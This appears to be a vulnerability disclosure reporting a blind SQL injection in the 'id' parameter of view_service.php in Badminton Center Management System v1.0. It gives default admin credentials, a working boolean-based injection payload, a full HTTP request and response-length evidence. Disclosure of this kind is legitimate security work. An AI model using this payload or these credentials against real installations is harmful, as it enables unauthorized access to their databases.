# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File:  /bcms/admin/services/view_service.php?id=

Vulnerability location:  /bcms/admin/services/view_service.php?id=,id

[+] Payload: /bcms/admin/services/view_service.php?id=2%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /bcms/admin/services/view_service.php?id=2%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 847
![image](https://user-images.githubusercontent.com/54017627/170621625-f9590ec9-68eb-4e17-85f6-36b4b428d341.png)

![image](https://user-images.githubusercontent.com/54017627/170621441-73e23d56-3fbd-4063-a77d-861cfbb106d2.png)

When length (database ()) = 7, Content-Length: 748
![image](https://user-images.githubusercontent.com/54017627/170621603-5c0c6a1b-df9b-47f6-a69c-6d1ca518717d.png)

![image](https://user-images.githubusercontent.com/54017627/170621422-68acf8ed-fd54-40cf-9dbe-3f1ce2c52377.png)
